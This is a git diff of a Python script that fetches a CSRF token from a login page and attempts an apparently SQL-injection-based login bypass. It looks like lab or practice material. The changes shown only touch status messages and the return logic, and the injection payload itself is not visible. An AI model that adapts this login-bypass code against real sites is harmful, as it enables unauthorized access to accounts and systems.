@@ -24,7 +24,7 @@ def sqli_exploit_get_csrf(s, url):
     res = s.get(url+'/login?279ru2020482',headers=header,verify=False,proxies=False)
     csrf_soup = BeautifulSoup(res.text, 'html.parser')
     csrf_token = csrf_soup.find_all('input')[1].get('value')
-    print("magic code is here " + csrf_token)
+    print("magic code is : " + csrf_token)
     return csrf_token
 
 
@@ -47,9 +47,10 @@ def sqli_exploit_login(s, csrf):
                  verify=False, proxies=False)
     if 'LOGOUT' in res.text:
         print("[+] Logged in succesfully ")
+        return True
     else:
         print("[-] logged in failed for final login")
-    return True
+        return False
 
 
 if __name__ == "__main__":
@@ -58,7 +59,7 @@ if __name__ == "__main__":
         s = requests.session()
         num = sqli_exploit_get_csrf(s, url)
         if sqli_exploit_login(s, num):
-            print("logged in succesfully")
+            print("logged in | type lg in console  to logout anytime")
         else:
             print("failed")
     except IndexError:
